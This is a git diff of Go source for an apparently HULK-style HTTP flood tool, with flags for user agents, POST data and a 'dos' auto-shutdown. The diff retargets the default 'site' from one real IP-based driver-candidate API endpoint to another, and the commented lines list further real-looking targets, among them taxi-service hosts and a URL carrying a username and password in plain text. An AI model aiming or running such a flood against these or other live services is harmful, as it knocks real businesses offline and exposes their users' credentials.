@@ -88,12 +88,15 @@ func main() {
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	// flag.StringVar(&site, "site", "http://map.uz.taxi:8080/reverse?format=jsonv2&lat=41.28407468291545&lon=69.26207811157667&addressdetails=1&accept-language=en", "Destination site.")
 	// flag.StringVar(&site, "site", "http://213.230.120.147", "Destination site.")
-	flag.StringVar(&site, "site", "https://87.237.238.27:8089/driver_candidate_api/v1/settings", "Destination site.")
+	// flag.StringVar(&site, "site", "https://87.237.238.27:8089/driver_candidate_api/v1/settings", "Destination site.")
 	// flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")
 
 	// skat city
 	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/?username=2305&password=GBRHBTYH&lang=en", "Destination site.")
 	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/prefetch", "Destination site.")
+
+	//arzoni bizda
+	flag.StringVar(&site, "site", "https://213.230.124.250:8089/driver_candidate_api/v1/settings", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
